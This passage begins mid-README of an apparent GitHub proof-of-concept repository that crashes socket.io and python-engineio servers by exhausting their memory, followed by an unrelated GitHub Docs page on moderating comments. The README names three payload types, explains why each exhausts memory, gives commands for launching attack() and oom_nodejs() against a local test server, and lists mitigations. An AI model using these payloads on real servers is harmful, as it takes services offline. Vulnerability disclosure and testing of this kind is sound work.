 6: 0xf32558 v8::internal::Heap::CheckIneffectiveMarkCompact(unsigned long, double) [node]
 7: 0xf3ec78 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]
 8: 0xf3f78b v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 9: 0xf424c1 v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]
10: 0xf0c6f4 v8::internal::Factory::NewFillerObject(int, bool, v8::internal::AllocationSpace) [node]
11: 0x11c2b3e v8::internal::Runtime_AllocateInNewSpace(int, v8::internal::Object**, v8::internal::Isolate*) [node]
12: 0x5fafab4fc5d
[1]    9877 abort (core dumped)  node serve.js

```

With `many_tiny_packets`, the node process OOMs because of [a 2016 change to socket.io](https://github.com/socketio/socket.io/commit/e60bd5a4da9173acba7553c9e631b79770a8c8be) so that while extracting message packets from a payload, each packet is queued up with a nice closure waiting in a `FixedCircularBuffer` for the next tick before the packet handlers can run. Of course, the next tick doesn't come until after every packet has been queued.

With `many_heartbeats` (`1:21:21:21:21:21:21:21:21:2...`), each ping causes the server to create a pong packet object and add it to a buffer array. These buffered pong responses and their handling cause the OOM.

The `giant_packet` payload attacks [look up id](https://github.com/socketio/socket.io-parser/blob/652402a8568c2138da3c27c96756b32efca6c4bf/index.js#L314).

## Run

### Test server

#### Python

```
python3.7 -m venv .env || virtualenv -p `which python3` .env
.env/bin/activate
pip install Flask-SocketIO
# pip install eventlet  # Optional
python serve.py 2>/dev/null
```

With eventlet, a single payload appears to DoS the entire server until processing completes.
Without eventlet, the non-production server remains responsive until the thread pool is exhausted as it launches actual threads.

#### Node

```
npm install socket.io
node serve.js
# DEBUG=socket.io* node serve.js  # as an alternative
```

or

```
docker build -t socketio -f Dockerfile.node-server .
docker run --rm -p 5000:5000 socketio
```

### Send payload

Send payload using code in kill\_socket\_io.py.

```
python3.7 -m venv .env || virtualenv -p `which python3` .env
.env/bin/activate
pip install requests
python -i kill_socket_io.py  # Start interactive session
```

or

```
docker build -t kill-socket-io -f Dockerfile.kill-socket-io .
docker run --rm --network=host -it kill-socket-io
```

Within the interactive console you can run commands like:

```
x()  # Just saves typing!
attack('http://127.0.0.1:5000', make_payload=many_tiny_packets)
oom_nodejs_all()
oom_nodejs(make_payload=many_heartbeats)
oom_nodejs(make_payload=giant_packet)
```

OR use the CLI:

```
python kill_socket_io.py -h

```

## Survival

* Use SockJS instead of SocketIO
* Set `max_http_buffer_size` to a sensible value
* Improve library performance
* Restrict number of packets per payload (done in python-engineio v3.10.0+, doesn't protect from `giant_packet`)

## About

DoS python-engineio / socketio via the long polling transport

### Resources

[Readme](#readme-ov-file)

[Activity](/bcaller/kill-engine-io/activity)
### Stars

[**7**
stars](/bcaller/kill-engine-io/stargazers)
### Watchers

[**2**
watching](/bcaller/kill-engine-io/watchers)
### Forks

[**3**
forks](/bcaller/kill-engine-io/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fbcaller%2Fkill-engine-io&report=bcaller+%28user%29)

## [Releases](/bcaller/kill-engine-io/releases)

No releases published

## [Packages 0](/users/bcaller/packages?repo_name=kill-engine-io)

No packages published

## Languages

* [Python
  89.8%](/bcaller/kill-engine-io/search?l=python)
* [JavaScript
  5.5%](/bcaller/kill-engine-io/search?l=javascript)
* [HTML
  4.7%](/bcaller/kill-engine-io/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from docs.github.com_332f0a88_20250119_131359.html ===
[Skip to main content](#main-content)[GitHub Docs](/en)Version: Free, Pro, & TeamSearch GitHub DocsSearchSelect language: current language is EnglishOpen Search BarClose Search BarOpen MenuOpen Sidebar

* [Building communities](/en/communities "Building communities")/
* [Moderation](/en/communities/moderating-comments-and-conversations "Moderation")/
* [Manage comments](/en/communities/moderating-comments-and-conversations/managing-disruptive-comments "Manage comments")
[Home](/en)[Building communities](/en/communities)

* Healthy contributions
  + [Management & moderation](/en/communities/setting-up-your-project-for-healthy-contributions/about-community-management-and-moderation)
  + [Community profiles](/en/communities/setting-up-your-project-for-healthy-contributions/about-community-profiles-for-public-repositories)
  + [Access community profiles](/en/communities/setting-up-your-project-for-healthy-contributions/accessing-a-projects-community-profile)
  + [Add a code of conduct](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-code-of-conduct-to-your-project)
  + [Contributor guidelines](/en/communities/setting-up-your-project-for-healthy-contributions/setting-guidelines-for-repository-contributors)
  + [Add a license to a repo](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository)
  + [Add support resources](/en/communities/setting-up-your-project-for-healthy-contributions/adding-support-resources-to-your-project)
  + [Community health file](/en/communities/setting-up-your-project-for-healthy-contributions/creating-a-default-community-health-file)
  + [Encourage contributions](/en/communities/setting-up-your-project-for-healthy-contributions/encouraging-helpful-contributions-to-your-project-with-labels)
* Issue & PR templates
  + [About templates](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/about-issue-and-pull-request-templates)
  + [Configure](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/configuring-issue-templates-for-your-repository)
  + [Syntax for issue forms](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-issue-forms)
  + [Syntax for GitHub's form schema](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema)
  + [Create a PR template](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/creating-a-pull-request-template-for-your-repository)
  + [Create an issue template](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/manually-creating-a-single-issue-template-for-your-repository)
  + [Common validation errors when creating issue forms](/en/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms)
* Moderation
  + [Manage comments](/en/communities/moderating-comments-and-conversations/managing-disruptive-comments)
  + [Locking conversations](/en/communities/moderating-comments-and-conversations/locking-conversations)
  + [Limit interactions in repo](/en/communities/moderating-comments-and-conversations/limiting-interactions-in-your-repository)
  + [Limit interactions in account](/en/communities/moderating-comments-and-conversations/limiting-interactions-for-your-personal-account)
  + [Limit interactions in org](/en/communities/moderating-comments-and-conversations/limiting-interactions-in-your-organization)
  + [Track comment changes](/en/communities/moderating-comments-and-conversations/tracking-changes-in-a-comment)
  + [Manage abuse in your org](/en/communities/moderating-comments-and-conversations/managing-how-contributors-report-abuse-in-your-organizations-repository)
  + [Manage reported content](/en/communities/moderating-comments-and-conversations/managing-reported-content-in-your-organizations-repository)
* Maintaining safety
  + [Block from your account](/en/communities/maintaining-your-safety-on-github/blocking-a-user-from-your-personal-account)
  + [View blocked users in account](/en/communities/maintaining-your-safety-on-github/viewing-users-youve-blocked-from-your-personal-account)
  + [Unblock from your account](/en/communities/maintaining-your-safety-on-github/unblocking-a-user-from-your-personal-account)
  + [Block from your org](/en/communities/maintaining-your-safety-on-github/blocking-a-user-from-your-organization)
  + [View blocked users in org](/en/communities/maintaining-your-safety-on-github/viewing-users-who-are-blocked-from-your-organization)
  + [Unblock from your org](/en/communities/maintaining-your-safety-on-github/unblocking-a-user-from-your-organization)
  + [Reporting abuse or spam](/en/communities/maintaining-your-safety-on-github/reporting-abuse-or-spam)
* Using wikis
  + [About wikis](/en/communities/documenting-your-project-with-wikis/about-wikis)
  + [Manage wiki pages](/en/communities/documenting-your-project-with-wikis/adding-or-editing-wiki-pages)
  + [Create footer or sidebar](/en/communities/documenting-your-project-with-wikis/creating-a-footer-or-sidebar-for-your-wiki)
  + [Editing wiki content](/en/communities/documenting-your-project-with-wikis/editing-wiki-content)
  + [View a history of changes](/en/communities/documenting-your-project-with-wikis/viewing-a-wikis-history-of-changes)
  + [Change access permissions](/en/communities/documenting-your-project-with-wikis/changing-access-permissions-for-wikis)
  + [Disabling wikis](/en/communities/documenting-your-project-with-wikis/disabling-wikis)

* [Building communities](/en/communities "Building communities")/
* [Moderation](/en/communities/moderating-comments-and-conversations "Moderation")/
* [Manage comments](/en/communities/moderating-comments-and-conversations/managing-disruptive-comments "Manage comments")
# Managing disruptive comments

You can hide, edit, or delete comments on issues, pull requests, and commits.

## In this article

* [Hiding a comment](#hiding-a-comment)
* [Unhiding a comment](#unhiding-a-comment)
* [Editing a comment](#editing-a-comment)
* [Redacting sensitive information](#redacting-sensitive-information)
* [Deleting a comment](#deleting-a-comment)
* [Further reading](#further-reading)
## [Hiding a comment](#hiding-a-comment)

Organization moderators, and anyone with write access to a repository, can hide comments on issues, pull requests, and commits.

If a comment is off-topic, outdated, or resolved, you may want to hide a comment to keep a discussion focused or make a pull request easier to navigate and review. Hidden comments are minimized but people with read access to the repository can expand them.

![Screenshot of a hidden comment. The only visible content is "This comment has been minimized", with a button to show the comment.](/assets/cb-13766/images/help/repository/hidden-comment.png)

1. Navigate to the comment you'd like to hide.
2. In the upper-right corner of the comment, click , then click **Hide**.

   ![Screenshot of a pull request comment by octo-user. Below an icon of three dots, a dropdown menu is expanded, and "Hide" is outlined in orange.](/assets/cb-42438/images/help/repository/comment-menu-hide.png)
3. Using the "Choose a reason" dropdown menu, choose a reason to hide the comment. Then select **Hide comment**.

   ![Screenshot of a comment showing a menu to select a reason to hide the comment: Spam, Abuse, Off Topic, Outdated, Duplicate, or Resolved.](/assets/cb-67538/images/help/repository/choose-reason-for-hiding-comment.png)

## [Unhiding a comment](#unhiding-a-comment)

Organization moderators, and anyone with write access to a repository, can unhide comments on issues, pull requests, and commits.

1. Navigate to the comment you'd like to unhide.
2. On the right side of the comment, click  **Show comment**.
3. On the right side of the expanded comment, select the  dropdown menu, then click **Unhide**.

   ![Screenshot of a pull request comment marked as spam. Below an icon of three dots, a dropdown menu is expanded, and "Unhide" is outlined in orange.](/assets/cb-50118/images/help/repository/comment-menu-hidden.png)

## [Editing a comment](#editing-a-comment)

Anyone with write access to a repository can edit comments on issues, pull requests, and commits.

It's appropriate to edit a comment and remove content that doesn't contribute to the conversation and violates your community's code of conduct or GitHub's [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

Sometimes it may make sense to clearly indicate edits and their justification.

That said, anyone with read access to a repository can view a comment's edit history. The **edited** dropdown at the top of the comment contains a history of edits showing the user and timestamp for each edit.

![Screenshot of a comment by octo-user, which is partially redacted. In the header, next to "edited by octocat", a dropdown icon is outlined in orange.](/assets/cb-42069/images/help/repository/content-redacted-comment.png)

## [Redacting sensitive information](#redacting-sensitive-information)

Comment authors and anyone with write access to a repository can also delete sensitive information from a comment's edit history. For more information, see [Tracking changes in a comment](/en/communities/moderating-comments-and-conversations/tracking-changes-in-a-comment).

1. Navigate to the comment you'd like to edit.
2. In the upper-right corner of the comment, click , then click **Edit**.

   ![Screenshot of a pull request comment by octo-user. Below an icon of three dots, a dropdown menu is expanded, and "Edit" is outlined in orange.](/assets/cb-42473/images/help/repository/comment-menu-edit.png)
3. In the comment window, delete the content you'd like to remove, then type `[REDACTED]` to replace it.
4. At the bottom of the comment, type a note indicating that you have edited the comment, and optionally, why you edited the comment.
5. Click **Update comment**.

## [Deleting a comment](#deleting-a-comment)

Anyone with write access to a repository can delete comments on issues, pull requests, and commits. Organization owners, team maintainers, and the comment author can also delete a comment on a team page.

If a comment contains some constructive content that adds to the conversation in the issue or pull request, you can edit the comment instead.

Deleting a comment is your last resort as a moderator. It's appropriate to delete a comment if the entire comment adds no constructive content to a conversation and violates your community's code of conduct or GitHub's [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

Deleting a comment creates a timeline event that is visible to anyone with read access to the repository. However, the username of the person who deleted the comment is only visible to people with write access to the repository. For anyone without write access, the timeline event is anonymized.

![Screenshot of a timeline event, which says "octo-org deleted a comment from hubot 6 minutes ago."](/assets/cb-10760/images/help/issues/anonymized-timeline-entry-for-deleted-comment.png)

Note

The initial comment (or body) of an issue or pull request can't be deleted. Instead, you can edit issue and pull request bodies to remove unwanted content.

### [Steps to delete a comment](#steps-to-delete-a-comment)

1. Navigate to the comment you'd like to delete.
2. In the upper-right corner of the comment, click , then click **Delete**.
   ![Screenshot of a pull request comment by octo-user. Below an icon of three dots, a dropdown menu is expanded, and "Delete" is outlined in orange.](/assets/cb-42453/images/help/repository/comment-menu-delete.png)
3. Optionally, write a comment noting that you deleted a comment and why.

## [Further reading](#further-reading)

* [Managing moderators in your organization](/en/organizations/managing-peoples-access-to-your-organization-with-roles/managing-moderators-in-your-organization)
## Help and support

### Did you find what you needed?

 Yes No[Privacy policy](/en/site-policy/privacy-policies/github-privacy-statement)
### Help us make these docs great!

All GitHub docs are open source. See something that's wrong or unclear? Submit a pull request.

[Make a contribution](https://github.com/github/docs/blob/main/content/communities/moderating-comments-and-conversations/managing-disruptive-comments.md)

[Learn how to contribute](/contributing)

### Still need help?

[Ask the GitHub community](https://github.com/orgs/community/discussions)[Contact support](https://support.github.com)
## Legal

* © 2025 GitHub, Inc.
* [Terms](/en/site-policy/github-terms/github-terms-of-service)
* [Privacy](/en/site-policy/privacy-policies/github-privacy-statement)
* [Status](https://www.githubstatus.com/)
* [Pricing](https://github.com/pricing)
* [Expert services](https://services.github.com)
* [Blog](https://github.blog)

